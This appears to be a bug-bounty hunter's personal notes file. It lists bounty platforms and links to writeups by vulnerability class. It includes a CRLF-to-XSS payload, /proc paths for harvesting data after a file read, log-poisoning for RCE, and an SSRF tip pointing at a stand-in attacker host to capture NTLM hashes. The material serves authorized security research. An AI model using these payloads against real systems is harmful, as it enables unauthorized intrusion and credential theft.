# Platforms

## Russian

- https://bugbounty.ru
- https://yandex.ru/bugbounty/index
- https://support.kaspersky.ru/vulnerability/overview/12428?el=12429#block2
- https://www.jivo.ru/bugbounty/ 
- https://www.cloud4y.ru/cloud-services/bugbounty/ 
- https://kontur.ru/bugbounty 
- https://ru.liveagent.com/programma-bag-baunti/ 
- https://corp.mamba.ru/ru/developer/security 
- https://love.ru/bugbounty/ 
- https://bugbounty.mts-link.ru/
## Worldwide

- Immunefi
- https://bughunters.google.com/about/rules/5604090422493184/google-play-security-reward-program-rules

# by Schemes

- [Attacking Redis db via CR symbols in `git://` link](https://hackerone.com/reports/441090)
- [A tool](https://github.com/tarunkant/Gopherus) to attack different network services via a `gopher://` link

# by Vulns

## Cross-tenant attacks (related for cloud providers)

- [Finding local orchestrator API via script execution ability](https://orca.security/resources/blog/autowarp-microsoft-azure-automation-service-vulnerability/?ref=danaepp.com)
- [The confused deputy problem](https://securitylabs.datadoghq.com/articles/appsync-vulnerability-disclosure/)
## CRLF Injection

[Session Fixation](https://hackerone.com/reports/15492) via [nginx misconfiguration](http://blog.volema.com/nginx-insecurities.html)

Escalation to XSS: 
```
?name=Bob%0d%0a%0d%0a<script>alert(document.domain)</script>
```

## Local File Read

Read `web.config` file to obtain .NET ViewState's MachineKey and DecryptionKey, which are allow you to do deserialization attacks: https://www.silentgrid.com/blog/local-file-read-to-rce/.

Leak some [juicy OS info](https://www.kernel.org/doc/html/latest/filesystems/proc.html):
- /proc/version - OS Version
- /proc/net/tcp - open TCP ports
- /proc/net/udp - open UDP ports
- /proc/sched_debug - can be used to retrieve running processes
- /proc/mounts - mounted devices
- /proc/[PID]/cmdline - command line that triggered the running process (fuzz pid here)
- /proc/[PID]/environ - environment variables accessible to the process
- /proc/[PID]/cwd - current working directory of the process
- /proc/[PID]/fd/[n] - files opened by the process
- /proc/[PID]/exe - link to the executable file

## Local File Inclusion

Read `../../../../var/log/apache2/access.log` or [same file via proc](https://xen0vas.github.io/Exploiting-the-LFI-vulnerability-using-the-proc-self-stat-method/#) to get RCE via `User-Agent`.

## SSRF

Try `\\attacker.com\test.jpg` links with a running Responder to capture Net-NTLMv2 hashes.

## Open Redirect

Can be escalated when app uses OAuth; redirection can be done using `javascript:` scheme (see https://rdnzx.medium.com/chaining-open-redirect-with-xss-to-account-takeover-36acf218a6d5 and some more payloads for fuzzing in hacktricks).

Redirection is found on reverse proxy and [can move you to internal servises (SSRF)](https://blog.detectify.com/2019/05/16/the-real-impact-of-an-open-redirect/).

## WebView

[RCE via @JavascriptInterface](https://dphoeniixx.medium.com/tiktok-for-android-1-click-rce-240266e78105)

## File upload

Always look for the command injection if you have noticed that your files are edited or converted in some way.

### Image

Basically SVG files can be used to insert arbitary JavaScript code via `script` tag and even entire HTML-markup via the `foreignObject` tag: https://github.com/allanlw/svg-cheatsheet.

If an old version of librsvg is used to convert SVG to PNG, it can cause a [memory leakage](https://hackerone.com/reports/2107680).

### Video

[SSRF-LFR in FFmpeg](https://hackerone.com/reports/1062888)

### XLSX

[XXE](https://hackerone.com/reports/105434)

## Serialization
### PHP

https://habr.com/ru/articles/708384/